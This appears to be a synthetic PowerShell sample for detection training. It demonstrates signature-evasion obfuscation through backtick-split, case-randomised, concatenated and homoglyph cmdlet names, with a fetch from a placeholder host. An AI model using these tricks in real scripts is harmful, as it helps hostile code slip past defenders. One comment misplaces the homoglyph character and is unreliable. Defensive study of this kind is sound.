<#
    Update-Cache.ps1  (SYNTHETIC / DEFANGED — for detection training only)

    Demonstrates the character-masking sub-patterns of T1027.010 (Command
    Obfuscation): backtick splitting, case randomization, string
    concatenation/reordering, and Unicode homoglyph substitution. Every
    payload here is a harmless Write-Host — no live infrastructure, no
    real weaponized behavior. Placeholder domain only.
#>

# 1. Backtick-split cmdlet name to defeat literal string signatures.
I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n "Write-Host 'cache warmed'"

# 2. Case-randomized cmdlet name — PowerShell resolves it identically
#    (cmdlet names are case-insensitive); the irregular casing exists
#    purely to defeat case-sensitive literal-string signatures.
$url = "hxxps://cdn-assets.contoso-corp[.]test/lib/update.txt".Replace('hxxps', 'https').Replace('[.]', '.')
InVoKe-ResTMethod -Uri $url -Method Get | Out-Null

# 3. Cmdlet name rebuilt via string concatenation instead of typed directly.
$name = 'Inv' + 'oke-Exp' + 'ression'
& $name "Write-Host 'concat path executed'"

# 4. Unicode homoglyph: the cmdlet below reads as "Invoke-Command" but the
#    second letter is a Cyrillic lookalike (U+043E CYRILLIC SMALL LETTER O),
#    not a Latin 'o' — defeats naive ASCII literal-string matching.
Invоke-Command -ScriptBlock { Write-Host 'homoglyph path executed' }
